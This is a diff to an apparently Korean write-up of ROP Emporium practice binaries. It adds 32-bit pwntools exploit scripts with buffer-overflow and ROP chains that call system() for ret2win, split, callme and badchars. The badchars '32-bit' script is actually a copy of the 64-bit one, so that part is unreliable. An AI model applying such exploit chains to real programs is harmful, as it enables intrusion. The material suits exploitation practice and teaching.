@@ -44,7 +44,19 @@ pl = 'a'*0x28 + p64(e.symbols['ret2win'])
 p.recvuntil('> ')
 p.sendline(pl)
 p.interactive()
+```
+exploit32.py:
+```python
+from pwn import *
 
+e = ELF('./ret2win32')
+p = process('./ret2win32')
+
+pl = 'a'*0x2c + p32(e.symbols['ret2win'])
+
+p.recvuntil('> ')
+p.sendline(pl)
+p.interactive()
 ```
 출력:
 ```bash
@@ -122,6 +134,20 @@ systemplt = 0x4005e0
 pl = 'a'*0x28 + p64(pr) + p64(bincat) + p64(systemplt)
 
 p = process('./split')
+p.recvuntil('> ')
+p.sendline(pl)
+p.interactive()
+```
+exploit32.py:
+```python
+from pwn import *
+
+bincat = 0x804a030
+systemplt = 0x8048430
+
+pl = 'a'*0x2c + p32(systemplt) + p32(0) + p32(bincat)
+
+p = process('./split32')
 p.recvuntil('> ')
 p.sendline(pl)
 p.interactive()
@@ -231,6 +257,24 @@ payload += p64(pppr) + p64(1) + p64(2) + p64(3)
 payload += p64(e.plt['callme_two'])
 payload += p64(pppr) + p64(1) + p64(2) + p64(3)
 payload += p64(e.plt['callme_three'])
+
+p.recvuntil('> ')
+p.sendline(payload)
+p.interactive()
+```
+exploit32.py:
+```python
+from pwn import *
+
+e = ELF('./callme32')
+p = process(['./callme32'], env = {'LD_PRELOAD':'./libcallme32.so'})
+
+pppr = 0x8048576
+
+payload = 'a'*0x2c
+payload += p32(e.plt['callme_one']) + p32(pppr) + p32(1) + p32(2) + p32(3)
+payload += p32(e.plt['callme_two']) + p32(pppr) + p32(1) + p32(2) + p32(3)
+payload += p32(e.plt['callme_three']) + p32(pppr) + p32(1) + p32(2) + p32(3)
 
 p.recvuntil('> ')
 p.sendline(payload)
@@ -518,6 +562,34 @@ pl += p64(pr) + p64(buffer)
 pl += p64(systemplt)
 
 #check(pl)
+
+p = process('./badchars')
+p.recvuntil('> ')
+p.sendline(pl)
+p.interactive()
+```
+exploit32.py:
+```python
+from pwn import *
+
+xr = 0x400b30
+mr = 0x400b34
+pr = 0x400b39
+ppr = 0x400b3b
+ppr2 = 0x400b40
+buffer = 0x601000
+# xor encrypted flag
+binsh = '\x4e\x03\x08\x0f\x4e\x12\x09\x61'
+# xor encryption key
+key = p64(0x61)
+systemplt = 0x4006f0
+
+pl = 'a'*0x28
+pl += p64(ppr) + binsh + p64(buffer) + p64(mr)
+for i in range(0,8):
+    pl += p64(ppr2) + key + p64(buffer+i) + p64(xr)
+pl += p64(pr) + p64(buffer)
+pl += p64(systemplt)
 
 p = process('./badchars')
 p.recvuntil('> ')
